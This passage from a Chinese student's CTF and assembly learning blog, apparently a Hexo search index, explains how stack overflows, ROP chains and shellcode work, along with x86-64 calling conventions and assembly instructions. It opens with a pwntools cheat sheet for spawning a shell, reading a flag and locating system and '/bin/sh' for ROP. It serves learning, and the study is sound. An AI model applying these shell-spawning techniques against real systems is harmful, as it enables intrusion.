data-language="python"><code class="language-python">context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>context<span class="token punctuation">.</span>os <span class="token operator">=</span> <span class="token string">'Linux'</span>context<span class="token punctuation">.</span>endian <span class="token operator">=</span> <span class="token string">'little'</span> <span class="token comment">#小端序</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="shellcode-amp-asm"><a href="#shellcode-amp-asm" class="headerlink" title="shellcode &amp; asm"></a>shellcode &amp; asm</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>shellcraft<span class="token punctuation">.</span>i386<span class="token punctuation">.</span>mov<span class="token punctuation">(</span><span class="token string">'eax'</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span>pwnlib<span class="token punctuation">.</span>shellcraft<span class="token punctuation">.</span>i386<span class="token punctuation">.</span>linux<span class="token punctuation">.</span>cat<span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span> fd<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#读取flag并输出，可以使用asm()包裹</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">e <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'elf_file'</span><span class="token punctuation">)</span> <span class="token comment">#寻找elf文件中的function</span>e<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span> <span class="token comment">#puts在got表的地址</span>e<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span> <span class="token comment">#puts在plt表中的地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="libc"><a href="#libc" class="headerlink" title="libc"></a>libc</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">lib  <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc.so.6'</span><span class="token punctuation">)</span> <span class="token comment">#寻找libc中的function</span>lib<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token comment">#寻找system的offset</span>lib<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span> <span class="token comment">#找/bin/sh的offset</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">'elf_file'</span><span class="token punctuation">)</span> <span class="token comment">#会产生一个空的rop链</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#打印出当前的chain</span>rop<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#dump出chain在stack的样子</span>rop<span class="token punctuation">.</span>raad<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#如果存在可以组成read(0,.bss+0x80)的gadgets，就加入rop chain</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span> <span class="token comment">#将/bin/sh字符串直接加入rop chain</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>栈溢出、rop链、shellcode原理解析</title>
      <link href="/2022/12/21/%E6%A0%88%E6%BA%A2%E5%87%BA%E3%80%81rop%E9%93%BE%E3%80%81shellcode%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/"/>
      <url>/2022/12/21/%E6%A0%88%E6%BA%A2%E5%87%BA%E3%80%81rop%E9%93%BE%E3%80%81shellcode%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="shellcode原理："><a href="#shellcode原理：" class="headerlink" title="shellcode原理："></a>shellcode原理：</h1><p>shellcode通常使用机器语言编写，是一段用于利用软件漏洞而执行的代码其目的常常让攻击者获得目标机器的命令行shell而得名。<br>shellcode根据他是攻击者控制他所运行的机器，还是通过网络控制另一台机器，可以分为本地和远程两种类型有时攻击者注入目标进程中的字节数是被限制的，因此可以将shellcode分阶段进行，由前一阶段比较简短的shellcode将后一阶段比较复杂的shellcode下载并执行。</p><h1 id="栈溢出原理："><a href="#栈溢出原理：" class="headerlink" title="栈溢出原理："></a>栈溢出原理：</h1><p>由于C语言对数组引用不做任何边界的检查，从而导致缓冲区溢出（<em>buffer overflow</em>）成为一种常见的漏洞。根据溢出发生的内存位置，通常可以分为栈溢出和堆溢出。由于栈上保存着局部变量和一些状态信息，一旦发生严重的溢出，攻击者就可以通过复盖返回地址来执行任意代码，利用方法包括shellcode注入、ret2libc、rop等。<br>在之前的博客中有提到，<strong>函数以栈的形式调用</strong>，在每个栈的底部有rbp指针和我们的返回地址，如果溢出<strong>足够多</strong>的字节，就可以将rbp指针和返回地址给<strong>覆盖</strong>，当函数执行到返回地址时就可以按照我们所设计好的地址<strong>跳跃</strong>到目标函数继续执行获得shell。</p><h1 id="rop链原理："><a href="#rop链原理：" class="headerlink" title="rop链原理："></a>rop链原理：</h1><p>对于rop原理我学得磕磕碰碰，（老师讲得有点模糊）主要是一个地方没讲好，希望后来人别被卡住。<br>最开始要利用栈溢出，只需要将返回地址覆盖为jmp esp的指令地址，并在后面添加shellcode就可以执行 后来引入了NX缓解机制，数据的所在内存页被标记为不可执行此时再执行shellcode就会抛出异常，所以注入新的代码并不可行，那么就复用程序中已有的代码。<br>于是rop链技术就诞生了使用rop链就要先扫描文件，提取出可用的gadget片段（通常以ret指令结尾）<strong>的地址</strong>（划重点），然后将这些gadget根据需要的功能进行组合达到攻击者的目的（刚开始老师没讲清楚是<strong>地址</strong>，导致我一直在自己猜想怎么拼接的）。<br>这里附一张图更好理解：<br><img src="/images/%E6%A0%88%E6%BA%A2%E5%87%BA%E3%80%81rop%E9%93%BE%E3%80%81shellcode%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/1.webp" alt="1"><br>也就是覆盖返回地址为gadget的地址，跳到gadget片段上执行在此gadget的地址下附上另一个gadget的地址，以此类推连成rop链。<br>如图pop rdi完rsp向下跳一格，并继续执行return指令实现&#x2F;bin&#x2F;sh_的函数调用获取shell。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>函数的调用和约定</title>
      <link href="/2022/11/05/%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E5%92%8C%E7%BA%A6%E5%AE%9A/"/>
      <url>/2022/11/05/%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E5%92%8C%E7%BA%A6%E5%AE%9A/</url>
      
        <content type="html"><![CDATA[<h2 id="函数的调用"><a href="#函数的调用" class="headerlink" title="函数的调用"></a>函数的调用</h2><h4 id="计算机内部的数据存储形式"><a href="#计算机内部的数据存储形式" class="headerlink" title="计算机内部的数据存储形式"></a>计算机内部的数据存储形式</h4><p>计算机内部有两种存储形式，分为大端序、小端序。</p><h6 id="大端序："><a href="#大端序：" class="headerlink" title="大端序："></a>大端序：</h6><p>以0123456789abcdef为例，数据最高位01存储在低位，最低位ef存储在高位。<br>如图：<br><img src="/images/%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E5%92%8C%E7%BA%A6%E5%AE%9A/1.png"><br>将此数据按照字符串输出，得到的为：\x01\x23\x45\x67\x89\xab\xcd\xef</p><h6 id="小端序："><a href="#小端序：" class="headerlink" title="小端序："></a>小端序：</h6><p>一0123456789abcdef为例，数据最高位01存储在高位，最低位ef存储在低位。<br>如图：<br><img src="/images/%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E5%92%8C%E7%BA%A6%E5%AE%9A/2.png"><br>将此数据按照字符串输出，得到的为：\xef\xcd\xab\x89\67\x45\x23\x01</p><h6 id="两种方式比较"><a href="#两种方式比较" class="headerlink" title="两种方式比较"></a>两种方式比较</h6><p>从输出结果来看，大端序符合人类阅读习惯。<br>从存储逻辑、数学运算规律，小端序更正常。<br>总结为<strong>“大端序：高低低高，小端序：高高低低”</strong><br>对于linux而言，是以小端序存储，所以我们以字符串的形式输入一个数字时，要注意格式。<br>比如输入0xdeadbeef这个字符串，输入就是”\xef\xbe\xad\xde”传入程序。<br>但我们有pwntools，p32即可完成自动转换。</p><h4 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h4><p>linux系统中，把一切都看做是文件，当进程打开现有文件或创建新文件时，内核向进程返<br>回一个文件描述符，文件描述符就是内核为了高效管理已被打开的文件所创建的索引，用来<br>指向被打开的文件，所有的i&#x2F;o操作的系统调用都会通过文件描述符。<br>每个文件描述符会与一个打开的文件相对应，不同的文件描述符也可能指向同一个文件。<br>相同的文件可以被不同的进程打开，也可以在同一个进程被多次打开。</p><h4 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h4><p>栈是一种LIFO（先进后出）的数据结构。栈的基本操作有两种：<strong>push（压栈）</strong>和<strong>pop（弹栈）</strong>。<br>由于函数的调用顺序也是LIFO，所以绝大多数系统都是通过栈这一数据结构来维护函数调用关系的。<br>在Linux系统中，系统为每一个进程都安排了一个栈，进程中每一个调用的函数都有自己独立的栈帧。<br><strong>栈是由高地址向低地址生长的。高地址为栈底，低地址为栈顶。</strong><br>很多算法都是用栈实现的。以递归的形式实现一些算法在本质上来说也是利用栈结构。只不过没有在程序<br>中另外申请一个栈，而是利用函数调用栈。</p><h4 id="函数的调用流程"><a href="#函数的调用流程" class="headerlink" title="函数的调用流程"></a>函数的调用流程</h4><p>以一下代码为例：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">func_a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//do sth.</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">func_b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">func_a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> c<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">func_b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> a<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>main函数调用func_b,func_b调用func_a。<br>我们从main函数开始，逐步分析栈帧变化。<br>当运行到call func_b时main函数的栈帧如下：<br><img src="/images/%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E5%92%8C%E7%BA%A6%E5%AE%9A/3.png"><br>rbp指向栈底，rsp指向栈顶，这些栈帧存放了一些main的局部变量。<br>main函数要调用func_b，main只要call func_b，也就是</p><pre class="line-numbers language-none"><code class="language-none">push rip；mov rip func_b；<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>当然被调用的函数还要维护栈帧。（用rsp与rbp开辟空间）</strong><br>如下</p><pre class="line-numbers language-none"><code class="language-none">push rbp;  &#x2F;*将调用函数的栈底指针保存*&#x2F;mov rbp rsp;  &#x2F;*将栈底指针指向现在的栈顶*&#x2F;sub rsp xxx;  &#x2F;*开辟被调用函数的栈帧，此时上一步的rbp就指向栈帧的底*&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/images/%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E5%92%8C%E7%BA%A6%E5%AE%9A/4.png"><br>同理根据以上步骤调用func_a也是一样的<br>如图：<br><img src="/images/%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E5%92%8C%E7%BA%A6%E5%AE%9A/5.png"><br>在函数执行结束后返回时，会执行leave；ret；<br>也就是：</p><pre class="line-numbers language-none"><code class="language-none">mov rsp rbp；&#x2F;*将栈顶指针指向栈底*&#x2F;pop rbp；&#x2F;*将栈底指针弹出*&#x2F;（其实就是改变rsp的值个人认为）pop rip；&#x2F;*将fun_b的下一行地址弹出到rip*&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>栈布局如图：<br><img src="/images/%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E5%92%8C%E7%BA%A6%E5%AE%9A/4.png"><br>直到结束函数释放栈空间。<br>总结如下：<br><strong>调用函数：将rip压栈，然后将rip赋值为被调用函数的起始地址。这一操作被隐性地内置在call指令中。</strong><br><strong>被调用函数：先保存调用函数的rbp指针，将自己的rbp指针指向栈顶，然后开辟栈空间自用，此时rbp就成了被调用函数的栈底。</strong><br><strong>函数返回：恢复栈帧，返回调用函数的返回地址。</strong></p><h2 id="调用约定"><a href="#调用约定" class="headerlink" title="调用约定"></a>调用约定</h2><p>一般来说，一个函数的返回值会存储到<strong>rax寄存器</strong>。<br>x86-64下函数的调用约定为：<br>从左至右参数依次传递给<strong>rdi，rsi，rdx，rcx，r8，r9</strong>。<br>如果一个函数的参数大于六个，则<strong>从右至左</strong>压入栈中传递。（因为栈LIFO）<br>syscall指令用于调用系统函数，调用时需要指明系统调用号。系统调用号存在rax寄存器中。之后布置好参数，执行syscall即可。<br>系统调用的常用调用号码如下：<br><img src="/images/%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E5%92%8C%E7%BA%A6%E5%AE%9A/6.png"><br>如调用read（0，buf，size）：</p><pre class="line-numbers language-none"><code class="language-none">mov rax,0    &#x2F;*read&#39;s syscall number.*&#x2F;mov rdi,0    &#x2F;*first arg*&#x2F;mov rsi,buf   &#x2F;*second arg.*&#x2F;mov rdx,size  &#x2F;*third arg.*&#x2F;syscall    &#x2F;*excute read(0,buf,size)*&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>汇编指令小结</title>
      <link href="/2022/11/01/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E5%B0%8F%E7%BB%93/"/>
      <url>/2022/11/01/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E5%B0%8F%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="一-算术运算指令"><a href="#一-算术运算指令" class="headerlink" title="一.算术运算指令"></a>一.算术运算指令</h2><table><thead><tr><th>指令</th><th>模板</th><th>具体作用</th></tr></thead><tbody><tr><td>add</td><td>add ax,bx</td><td>将bx+ax的值储存在ax中</td></tr><tr><td>sub</td><td>sub ax,bx</td><td>将ax-bx的值存在ax中</td></tr><tr><td>inc</td><td>inc bx</td><td>将bx的值加1,不影响flag寄存器相关位置</td></tr><tr><td>dec</td><td>dec bx</td><td>将bx的值减1，……</td></tr><tr><td>mul</td><td>mul ax,bx</td><td>将ax*bx的值存在ax中，如果是32位乘法则要将高位字节储存与dx中，低位储存于ax中,16位大差不差</td></tr><tr><td>div</td><td>div ax,bx</td><td>ax&#x2F;bx的值储存于ax……</td></tr><tr><td>adc</td><td>adc ah,bh</td><td>(ah）&#x3D;（bh）+（ah）+ CF</td></tr><tr><td>sbb</td><td>sbb ax,bx</td><td>（ax）&#x3D;（ax）-（bx）- CF</td></tr><tr><td>cmp</td><td>cmp ax,bx</td><td>将ax-bx但不储存在任何地方只影响flag寄存器的相关位置，用于判断两数大小</td></tr></tbody></table><h2 id="二-逻辑运算指令"><a href="#二-逻辑运算指令" class="headerlink" title="二.逻辑运算指令"></a>二.逻辑运算指令</h2><table><thead><tr><th>指令</th><th>模板</th><th>具体作用</th></tr></thead><tbody><tr><td>and</td><td>and ax,bx</td><td>用于定向更改二进制数的某位，如字母的大小写变换，只有两边同为1时结果为1</td></tr><tr><td>or</td><td>or ax,bx</td><td>只有两边都为0时结果为0，其它为1</td></tr><tr><td>xor</td><td>xor ax,bx</td><td>同为1或0结果为0或者为1</td></tr><tr><td>not</td><td>not al</td><td>取al值的反码</td></tr></tbody></table><h2 id="三-目的地址传送指令"><a href="#三-目的地址传送指令" class="headerlink" title="三.目的地址传送指令"></a>三.目的地址传送指令</h2><table><thead><tr><th>指令</th><th>模板</th><th>具体作用</th></tr></thead><tbody><tr><td>lea</td><td>lea bx,dx:[98H]</td><td>把偏移地址存到dx，相当于C语言中的&amp;符号</td></tr><tr><td>lds</td><td>lds si,string</td><td>把段地址：偏移地址存到ds:si中</td></tr><tr><td>les，lfs，lgs，lss</td><td>……</td><td>……</td></tr></tbody></table><h2 id="四-通用数据传送指令"><a href="#四-通用数据传送指令" class="headerlink" title="四.通用数据传送指令"></a>四.通用数据传送指令</h2><table><thead><tr><th>指令</th><th>模板</th><th>具体作用</th></tr></thead><tbody><tr><td>mov</td><td>mov ax,bx</td><td>将bx中的数据覆盖到ax中</td></tr><tr><td>push</td><td>push ax</td><td>将ax中的值压入栈中</td></tr><tr><td>pop</td><td>pop ax</td><td>将栈中的值取出进ax中</td></tr></tbody></table><h2 id="五-程序转移指令（长转移）"><a href="#五-程序转移指令（长转移）" class="headerlink" title="五.程序转移指令（长转移）"></a>五.程序转移指令（长转移）</h2><table><thead><tr><th>指令</th><th>模板</th><th>具体作用</th></tr></thead><tbody><tr><td>jmp</td><td>jmp ax,bx</td><td>无条件跳转指令，根据偏移量进行跳转</td></tr><tr><td>call</td><td>call s</td><td>将当前地址推入栈中，并跳转到s处</td></tr><tr><td>ret</td><td>ret</td><td>将栈中地址弹出至ds：ip并跳转</td></tr></tbody></table><h4 id="条件转移指令（短转移）"><a href="#条件转移指令（短转移）" class="headerlink" title="条件转移指令（短转移）"></a>条件转移指令（短转移）</h4><table><thead><tr><th>指令</th><th>模板</th><th>具体作用</th></tr></thead><tbody><tr><td>je&#x2F;jz</td><td>je&#x2F;jz s</td><td>若相等则跳转</td></tr><tr><td>jne&#x2F;jnz</td><td>……</td><td>若不相等则跳转</td></tr><tr><td>jb&#x2F;jl</td><td>……</td><td>若小于则跳转</td></tr><tr><td>ja&#x2F;jg</td><td>……</td><td>若大于则跳转</td></tr><tr><td>jge</td><td>……</td><td>若大于等于则跳转</td></tr><tr><td>jle</td><td>……</td><td>若小于等于则跳转</td></tr></tbody></table><h4 id="循环控制指令"><a href="#循环控制指令" class="headerlink" title="循环控制指令"></a>循环控制指令</h4><table><thead><tr><th>指令</th><th>模板</th><th>具体作用</th></tr></thead><tbody><tr><td>loop</td><td>loop s</td><td>消耗cx中的值，并跳转至s处</td></tr><tr><td>jcxz</td><td>jcxz s</td><td>当cx中值为0时跳转至s</td></tr><tr><td>jecxz</td><td>……</td><td>……</td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>浅析jmp指令的原理</title>
      <link href="/2022/10/27/%E6%B5%85%E6%9E%90jmp%E6%8C%87%E4%BB%A4%E7%9A%84%E5%8E%9F%E7%90%86/"/>
      <url>/2022/10/27/%E6%B5%85%E6%9E%90jmp%E6%8C%87%E4%BB%A4%E7%9A%84%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>搭建博客以来一直很少更新，从这篇开始会加快更新进度。<br>以下是对《汇编语言》中的八实验的解析：</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="line-numbers language-none"><code class="language-none">assume cs:codesgcodesg segment                             mov ax,4c00h               int 21h       start:        mov ax,0                             s:      nop                       nop                       mov di,offset s                       mov si,offset s2                       mov ax,cs:[si]                       mov cs:[di],ax                           s0:        jmp short s                             s1:        mov ax,0                                               int 21h                       mov ax,0                                     s2:     jmp short s1                       nop       codesg ends       end start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="猜想"><a href="#猜想" class="headerlink" title="猜想"></a>猜想</h2><p>通过代码解读:它首先用offset指令取s的地址存在di中，后取s2的地址存在si中通过mov ax,cs[si]与 mov cs:[di],ax<br>将s2地址的储存单元中的指令搬到了s地址的储存单元中并执行，执行后应该跳到s1处进入死循环。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>实际却非如此：</p><p>一.先对内存空间进行查看：<br><img src="/images/%E6%B5%85%E6%9E%90jmp%E6%8C%87%E4%BB%A4%E7%9A%84%E5%8E%9F%E7%90%86/1.png" alt="1"><br>二.单步进行输入“t”查看运行<br><img src="/images/%E6%B5%85%E6%9E%90jmp%E6%8C%87%E4%BB%A4%E7%9A%84%E5%8E%9F%E7%90%86/2.png" alt="2"><br><img src="/images/%E6%B5%85%E6%9E%90jmp%E6%8C%87%E4%BB%A4%E7%9A%84%E5%8E%9F%E7%90%86/3.png" alt="3"><br> 这里jump  0008就是到s的地址，在之前s的内存已经被s2覆盖于是cs ip指向s2代表的代码，于是执行后cs ip指向下一指令也就是0010到0011的数<br>据储存，将其作为代码执行。<br>那么问题来了，为什么变成了jmp 0000了？<br><img src="/images/%E6%B5%85%E6%9E%90jmp%E6%8C%87%E4%BB%A4%E7%9A%84%E5%8E%9F%E7%90%86/4.png" alt="4"><br>如图：<br>因为jmp指令是根据s2到s1的标号偏移量决定的，在还没执行前就已经定好了即决定了偏移量为F6，而F6作为补码<br>储存，作用为-10，也就是减10个字节。也就从0010减到了0000 也就是开始的代码<br>mov ax,4c00h<br>int 21h<br>最终结束。<br>总结：jmp并不是随意跳跃的，是在开始就决定好的偏移量，如果如上题转换位置也只会按原来规定的偏移量进行，并不能换到我们目标位置。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>百度是个好东西</title>
      <link href="/2022/09/25/%E7%99%BE%E5%BA%A6%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B8%9C%E8%A5%BF/"/>
      <url>/2022/09/25/%E7%99%BE%E5%BA%A6%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B8%9C%E8%A5%BF/</url>
      
        <content type="html"><![CDATA[<p>今儿修改博客主题时又碰到了该死的hexo d出错，我貌似跟这玩意特别有缘，（可能是我删了什么东西……）委实不好评价我这个冤大头，一个字作！<br>于是我又去麻烦了学长，最终在学长的英明指导下在百度解决了问题。<br>问题如下：<br>Error: <code>prism_plugin</code> options should be added to _config.yml file<br>解决方法：<br>在blog目录下的conj.yml中打开，将以下代码放在最后即可，重新启动生成部署</p><pre class="line-numbers language-none"><code class="language-none">prism_plugin:  mode: &#39;preprocess&#39; # realtime&#x2F;preprocess  theme: &#39;default&#39;  line_number: false # default false<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>所以百度是个好东西！！！<br>（希望学长大大别对我感到厌烦）</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>千万要注意中英文！啊！啊！</title>
      <link href="/2022/09/20/%E5%8D%83%E4%B8%87%E8%A6%81%E6%B3%A8%E6%84%8F%E4%B8%AD%E8%8B%B1%E6%96%87%EF%BC%81%E5%95%8A%EF%BC%81%E5%95%8A%EF%BC%81/"/>
      <url>/2022/09/20/%E5%8D%83%E4%B8%87%E8%A6%81%E6%B3%A8%E6%84%8F%E4%B8%AD%E8%8B%B1%E6%96%87%EF%BC%81%E5%95%8A%EF%BC%81%E5%95%8A%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>  由于是第一次搭博客，遇到了很多问题。特别是在hexo g出错时，作为小白本白的我不出意外的被卡住了，看着天书一般的代码，我头皮发麻<br>……被将近卡住了半小时，哈哈，希望别笑我最终发现在最后的一个分号“;”我用成了中文字符导致出错，我给大家看看区别   英文“;”，中文“；”<br>中文字符更宽，呜呜呜！希望以后别碰到这种事……</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/09/20/hello-world/"/>
      <url>/2022/09/20/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
